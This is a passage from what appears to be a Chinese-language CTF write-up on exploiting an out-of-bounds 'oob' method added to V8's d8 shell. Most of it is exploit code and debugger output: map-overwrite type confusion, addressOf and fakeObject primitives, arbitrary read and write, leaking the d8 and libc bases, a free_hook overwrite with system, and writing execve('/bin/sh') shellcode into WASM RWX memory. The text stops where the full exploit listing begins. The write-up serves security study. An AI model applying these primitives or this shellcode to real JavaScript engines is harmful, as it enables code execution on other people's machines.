<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var floatArray = [<span class="number">1.11</span>, <span class="number">2.22</span>, <span class="number">3.33</span>];</span><br><span class="line">var mapFloatArray = floatArray.oob();</span><br><span class="line"></span><br><span class="line">d8&gt; %DebugPrint(floatArray)</span><br><span class="line"><span class="number">0x1a4e1c98e3b1</span> &lt;JSArray[<span class="number">3</span>]&gt;</span><br><span class="line">[<span class="number">1.11</span>, <span class="number">2.22</span>, <span class="number">3.33</span>]</span><br><span class="line">d8&gt; %DebugPrint(mapFloatArray)</span><br><span class="line"><span class="number">0x1a4e1c98e3d1</span> &lt;HeapNumber <span class="number">1.81206e-310</span>&gt;</span><br><span class="line"><span class="number">1.81206045893503e-310</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>xg <span class="number">0x1a4e1c98e3b1</span><span class="number">-1</span> </span><br><span class="line"><span class="number">0x1a4e1c98e3b0</span>:	<span class="number">0x0000215b6a782ed9</span>	<span class="number">0x00001a2de1f40c71</span> <span class="comment">// floatArray</span></span><br><span class="line"><span class="number">0x1a4e1c98e3c0</span>:	<span class="number">0x00001a4e1c98e389</span>	<span class="number">0x0000000300000000</span></span><br><span class="line"><span class="number">0x1a4e1c98e3d0</span>:	<span class="number">0x00001a2de1f40561</span>	<span class="number">0x0000215b6a782ed9</span> <span class="comment">// mapFloatArray</span></span><br></pre></td></tr></table></figure>
<p>而一字的越界写则可以对 JSArray-&gt;map 进行覆盖，既然可以操作 JSArray-&gt;map，那么最优的利用方式肯定就是类型混淆：</p>
<ul>
<li>由于 JSArray 是利用 <code>map</code> 来判断一个 <code>elements</code> 到底是数字还是指针</li>
<li>如果我们可以修改 <code>map</code>，就可以触发干扰 V8 对类型的判断</li>
</ul>
<p>常见的类型混淆如下：</p>
<ul>
<li>指针 -&gt; Double：数字类型可以直接获取数值（用于泄露某个 JS 对象的地址）</li>
<li>Double -&gt; 指针：指针类型会被当做一个对象（用于伪造一个 JS 对象，用于 WAA/RAA）</li>
</ul>
<p>具体代码细节如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">yhellow</span>:<span class="string">&quot;yhellow&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.11</span>, <span class="number">2.22</span>, <span class="number">3.33</span>];</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> mapFloatArray = floatArray.oob();</span><br><span class="line"><span class="keyword">var</span> mapObjArray = objArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">target</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = target;           </span><br><span class="line">    objArray.oob(mapFloatArray); <span class="comment">/* 指针-&gt;Double:使指针的地址可以直接被获取 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> ret = objArray[<span class="number">0</span>];         </span><br><span class="line">    objArray.oob(mapObjArray);      </span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">target</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = target;        </span><br><span class="line">    floatArray.oob(mapObjArray); <span class="comment">/* Double-&gt;指针:令V8把floatArray当做一个对象 */</span>   </span><br><span class="line">                                    </span><br><span class="line">    <span class="keyword">let</span> ret = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(mapFloatArray);  </span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来就要实现 WAA 和 RAA，可以通过将 JSArray-&gt;elements 数组伪造成一个数组对象，实现任意地址读写</p>
<ul>
<li>在 <code>elements[0]</code> 写入一个数组的 <code>map</code>，在 <code>elements[2]</code> 写入 <code>target - 0x10</code></li>
<li>然后再用 <code>fakeObject</code> 方法将 <code>elements[0]</code> 的地址伪造成一个对象 <code>fake_array</code></li>
<li>再对 <code>fake_array[0]</code> 进行读写，实际上就是对目标地址进行读写了 </li>
</ul>
<p>模型如下：</p>
<p><img src="/2022/12/06/V8+JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/1670253514098.png" alt="1670253514098"> </p>
<p>详细代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> floatArrayAddr = addressOf(floatArray);</span><br><span class="line"><span class="keyword">var</span> floatArrayElement = floatArrayAddr - <span class="number">0x28n</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; distance 0x03d9b124ecc1 0x3d9b124ece9</span></span><br><span class="line"><span class="comment">0x3d9b124ecc1-&gt;0x3d9b124ece9 is 0x28 bytes (0x5 words)</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="keyword">var</span> fakeArrayAddr = floatArrayElement + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fakeArray = fakeObject(i2f(fakeArrayAddr));</span><br><span class="line">floatArray[<span class="number">0</span>] = mapFloatArray;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RAA</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> +<span class="number">0x1n</span>); </span><br><span class="line">    <span class="keyword">let</span> data = fakeArray[<span class="number">0</span>];     </span><br><span class="line">    <span class="keyword">return</span> f2i(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dataBuf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> dataView = <span class="keyword">new</span> <span class="built_in">DataView</span>(dataBuf);</span><br><span class="line"><span class="keyword">var</span> bufBackStore = addressOf(dataBuf) + <span class="number">0x20n</span> -<span class="number">0x1n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WAA</span>(<span class="params">addr, value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>); </span><br><span class="line">    fakeArray[<span class="number">0</span>] = i2f(value);   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WAADataview</span>(<span class="params">addr, value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WAA(bufBackStore, addr);</span><br><span class="line">    dataView.setFloat64(<span class="number">0</span>, i2f(value), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>任意写 WAA 这里需要注意一下，由于 V8 的保护，不能直接将数据写入 <code>free_hook</code>，需要 <code>Dataview</code> 作为中介</li>
</ul>
<p>接着需要完成 <code>libc_base</code> 的泄露：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">60f</span>:<span class="number">3078</span>│  <span class="number">0x3553ea18a218</span> —▸ <span class="number">0x55b0ea5048b0</span> ◂— push   rbp</span><br><span class="line"><span class="number">610</span>:<span class="number">3080</span>│  <span class="number">0x3553ea18a220</span> —▸ <span class="number">0x2c5438080b71</span> ◂— <span class="number">0x200002c54380801</span></span><br><span class="line"><span class="number">611</span>:<span class="number">3088</span>│  <span class="number">0x3553ea18a228</span> —▸ <span class="number">0x55b0ea5048b0</span> ◂— push   rbp</span><br><span class="line"><span class="number">612</span>:<span class="number">3090</span>│  <span class="number">0x3553ea18a230</span> —▸ <span class="number">0x17dca8789009</span> ◂— <span class="number">0x700002c54380801</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>objAddr - 0x8000</code> 后面有一些特殊的指令 <code>push rbp</code></li>
<li>可以利用这里泄露出 <code>pro_base</code></li>
<li>然后就可以利用 <code>pro_base</code> 计算出 GOT 表地址，并泄露出 <code>libc_base</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    let push_rbp = RAA(searchBase);</span><br><span class="line">    <span class="keyword">if</span>((push_rbp &amp; <span class="number">0xfff</span>n) == <span class="number">0x8b0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        60f:3078│  0x3553ea18a218 —▸ 0x55b0ea5048b0 ◂— push   rbp</span></span><br><span class="line"><span class="comment">        610:3080│  0x3553ea18a220 —▸ 0x2c5438080b71 ◂— 0x200002c54380801</span></span><br><span class="line"><span class="comment">        611:3088│  0x3553ea18a228 —▸ 0x55b0ea5048b0 ◂— push   rbp</span></span><br><span class="line"><span class="comment">        612:3090│  0x3553ea18a230 —▸ 0x17dca8789009 ◂— 0x700002c54380801</span></span><br><span class="line"><span class="comment">        */</span> </span><br><span class="line">        let push_rbp2 = RAA(push_rbp);</span><br><span class="line">        <span class="keyword">if</span> (push_rbp2 == <span class="number">0x56415741e5894855</span>n)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            pwndbg&gt; x/xg 0x55b0ea5048b0</span></span><br><span class="line"><span class="comment">            0x55b0ea5048b0 &lt;v8::(anonymous namespace)::WebAssemblyInstantiate(v8::FunctionCallbackInfo&lt;v8::Value&gt; const&amp;)&gt;:	0x56415741e5894855</span></span><br><span class="line"><span class="comment">            */</span> </span><br><span class="line">            leak_addr = push_rbp;</span><br><span class="line">            pro_base = leak_addr - <span class="number">0xe618b0</span>n;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            pwndbg&gt; distance 0x55b0e96a3000 0x55b0ea5048b0</span></span><br><span class="line"><span class="comment">            0x55b0e96a3000-&gt;0x55b0ea5048b0 is 0xe618b0 bytes (0x1cc316 words)</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            console.<span class="built_in">log</span>(hex(searchBase) + <span class="string">&quot; -&gt; &quot;</span> +hex(leak_addr));</span><br><span class="line">            console.<span class="built_in">log</span>(<span class="string">&quot;[*] d8 base : &quot;</span> + hex(pro_base));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    searchBase += <span class="number">8</span>n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种泄露并不稳定，有许多偏移都需要手动计算，下面是一种稳定的泄露：</p>
<ul>
<li>打印 <code>floatArray-&gt;ArrayConstructor</code> 属性：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(floatArray.constructor);</span><br><span class="line"><span class="number">0x2be6ab0d0ec1</span> &lt;<span class="function">JSFunction <span class="title">Array</span> <span class="params">(sfi = <span class="number">0x24cf5e806791</span>)</span>&gt;</span></span><br><span class="line"><span class="function">function <span class="title">Array</span><span class="params">()</span> </span>&#123; [native code] &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x2be6ab0d0ec1</span></span><br><span class="line"><span class="number">0x2be6ab0d0ec1</span>: [Function] in OldSpace</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x36ed8a1c2d49</span> &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x2be6ab0c2109</span> &lt;JSFunction (sfi = <span class="number">0x24cf5e803b29</span>)&gt;</span><br><span class="line"> - elements: <span class="number">0x0310c3c80c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: <span class="number">0x2be6ab0d1111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - initial_map: <span class="number">0x36ed8a1c2d99</span> &lt;Map(PACKED_SMI_ELEMENTS)&gt;</span><br><span class="line"> - shared_info: <span class="number">0x24cf5e806791</span> &lt;SharedFunctionInfo Array&gt;</span><br><span class="line"> - name: <span class="number">0x0310c3c83599</span> &lt;String[#<span class="number">5</span>]: Array&gt;</span><br><span class="line"> - builtin: ArrayConstructor</span><br><span class="line"> - formal_parameter_count: <span class="number">65535</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: <span class="number">0x2be6ab0c1869</span> &lt;NativeContext[<span class="number">246</span>]&gt;</span><br><span class="line"> - code: <span class="number">0x01c365606981</span> &lt;Code BUILTIN ArrayConstructor&gt;</span><br><span class="line"> - properties: <span class="number">0x2be6ab0d1029</span> &lt;PropertyArray[<span class="number">6</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x24cf5e8004b9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#name: 0x24cf5e800449 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#prototype: 0x24cf5e800529 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="number">0x0310c3c84c79</span> &lt;Symbol: (native_context_index_symbol)&gt;: <span class="number">11</span> (<span class="keyword">const</span> data field <span class="number">0</span>) properties[<span class="number">0</span>]</span><br><span class="line">    <span class="number">0x0310c3c84f41</span> &lt;Symbol: Symbol.species&gt;: <span class="number">0x2be6ab0d0fd9</span> &lt;AccessorPair&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line">    #isArray: <span class="number">0x2be6ab0d1069</span> &lt;<span class="function">JSFunction <span class="title">isArray</span> <span class="params">(sfi = <span class="number">0x24cf5e806829</span>)</span>&gt; <span class="params">(<span class="keyword">const</span> data field <span class="number">1</span>)</span> properties[1]</span></span><br><span class="line"><span class="function">    <span class="meta">#from: 0x2be6ab0d10a1 <span class="meta-string">&lt;JSFunction from (sfi = 0x24cf5e806879)&gt;</span> (const data field 2) properties[2]</span></span></span><br><span class="line"><span class="function">    <span class="meta">#of: 0x2be6ab0d10d9 <span class="meta-string">&lt;JSFunction of (sfi = 0x24cf5e8068b1)&gt;</span> (const data field 3) properties[3]</span></span></span><br><span class="line"><span class="function"> &#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> - feedback <span class="built_in">vector</span>: <span class="keyword">not</span> available</span></span><br></pre></td></tr></table></figure>
<ul>
<li>打印 <code>floatArray-&gt;ArrayConstructor-&gt;code</code> 属性：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x01c365606981</span></span><br><span class="line"><span class="number">0x1c365606981</span>: [Code]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0310c3c80a31</span> &lt;Map&gt;</span><br><span class="line">kind = BUILTIN</span><br><span class="line">name = ArrayConstructor</span><br><span class="line">compiler = turbofan</span><br><span class="line">address = <span class="number">0x7fff49059878</span></span><br><span class="line"></span><br><span class="line">Trampoline (size = <span class="number">13</span>)</span><br><span class="line"><span class="number">0x1c3656069c0</span>     <span class="number">0</span>  <span class="number">49b</span>a80c7ae5c40560000 REX.W movq r10,<span class="number">0x56405caec780</span>  (ArrayConstructor)</span><br><span class="line"><span class="number">0x1c3656069ca</span>     a  <span class="number">41f</span>fe2         jmp r10</span><br><span class="line"></span><br><span class="line">Instructions (size = <span class="number">28</span>)</span><br><span class="line"><span class="number">0x56405caec780</span>     <span class="number">0</span>  <span class="number">493955</span>d8       REX.W cmpq [r13<span class="number">-0x28</span>] (root (undefined_value)),rdx</span><br><span class="line"><span class="number">0x56405caec784</span>     <span class="number">4</span>  <span class="number">7405</span>           jz <span class="number">0x56405caec78b</span>  (ArrayConstructor)</span><br><span class="line"><span class="number">0x56405caec786</span>     <span class="number">6</span>  <span class="number">488b</span>ca         REX.W movq rcx,rdx</span><br><span class="line"><span class="number">0x56405caec789</span>     <span class="number">9</span>  eb03           jmp <span class="number">0x56405caec78e</span>  (ArrayConstructor)</span><br><span class="line"><span class="number">0x56405caec78b</span>     b  <span class="number">488b</span>cf         REX.W movq rcx,rdi</span><br><span class="line"><span class="number">0x56405caec78e</span>     e  <span class="number">498b</span>5dd8       REX.W movq rbx,[r13<span class="number">-0x28</span>] (root (undefined_value))</span><br><span class="line"><span class="number">0x56405caec792</span>    <span class="number">12</span>  <span class="number">488b</span>d1         REX.W movq rdx,rcx</span><br><span class="line"><span class="number">0x56405caec795</span>    <span class="number">15</span>  e926000000     jmp <span class="number">0x56405caec7c0</span>  (ArrayConstructorImpl)</span><br><span class="line"><span class="number">0x56405caec79a</span>    <span class="number">1</span>a  <span class="number">90</span>             nop</span><br><span class="line"><span class="number">0x56405caec79b</span>    <span class="number">1b</span>  <span class="number">90</span>             nop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Safepoints (size = <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">RelocInfo (size = <span class="number">2</span>)</span><br><span class="line"><span class="number">0x1c3656069c2</span>  off heap target</span><br></pre></td></tr></table></figure>
<ul>
<li>可以通过这里来泄露 <code>pro_base</code></li>
<li>然后利用同样的方法来泄露 <code>libc_base</code></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pro_base = leak_addr - <span class="number">0xfc8780n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak_addr : &quot;</span> + hex(leak_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] d8 base : &quot;</span> + hex(pro_base));</span><br><span class="line"><span class="keyword">var</span> libc_start_main_got = pro_base + <span class="number">0x12a47b0n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_start_main = RAA(libc_start_main_got);</span><br><span class="line"><span class="keyword">var</span> libc_base = libc_start_main - <span class="number">0x23f90n</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] __libc_start_main: &quot;</span> + hex(libc_start_main));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] libc base : &quot;</span> + hex(libc_base));</span><br></pre></td></tr></table></figure>
<p>最后在 <code>free_hook</code> 中写入 <code>system</code> 就可以了</p>
<p>另外，还有一种不需要进行泄露，直接注入 shellcode 的方法： </p>
<ul>
<li>通过 WASM，能得到一块 RWX 的内存，里面放着WASM的二进制代码</li>
<li>将 shellcode 写入到这块内存，再调用 WASM 接口时，就会执行 shellcode 了 </li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">10</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> funcAsm = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> addressFasm = addressOf(funcAsm);</span><br><span class="line"><span class="keyword">var</span> sharedInfo = RAA(addressFasm+<span class="number">0x18n</span>-<span class="number">0x1n</span>);</span><br><span class="line"><span class="keyword">var</span> functionData = RAA(sharedInfo+<span class="number">0x8n</span>-<span class="number">0x1n</span>);</span><br><span class="line"><span class="keyword">var</span> instanceAddr = RAA(functionData+<span class="number">0x10n</span>-<span class="number">0x1n</span>);</span><br><span class="line"><span class="keyword">var</span> memoryRWX = RAA(instanceAddr+<span class="number">0x88n</span>-<span class="number">0x1n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Get RWX memory : &quot;</span> + hex(memoryRWX));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">        <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">        <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">        <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dataBuf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">56</span>);</span><br><span class="line"><span class="keyword">var</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(dataBuf);</span><br><span class="line"><span class="keyword">var</span> bufBackStore = addressOf(dataBuf) + <span class="number">0x20n</span> - <span class="number">0x1n</span>;</span><br><span class="line">WAA(bufBackStore, memoryRWX);</span><br><span class="line">dataview.setFloat64(<span class="number">0</span>, i2f(shellcode[<span class="number">0</span>]), <span class="literal">true</span>);</span><br><span class="line">dataview.setFloat64(<span class="number">8</span>, i2f(shellcode[<span class="number">1</span>]), <span class="literal">true</span>);</span><br><span class="line">dataview.setFloat64(<span class="number">16</span>, i2f(shellcode[<span class="number">2</span>]), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">funcAsm();</span><br></pre></td></tr></table></figure>
<ul>
<li>这是一个比较套路的过程</li>
</ul>
<p>完整 exp：</p>
<ul>
<li>不稳定泄漏：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 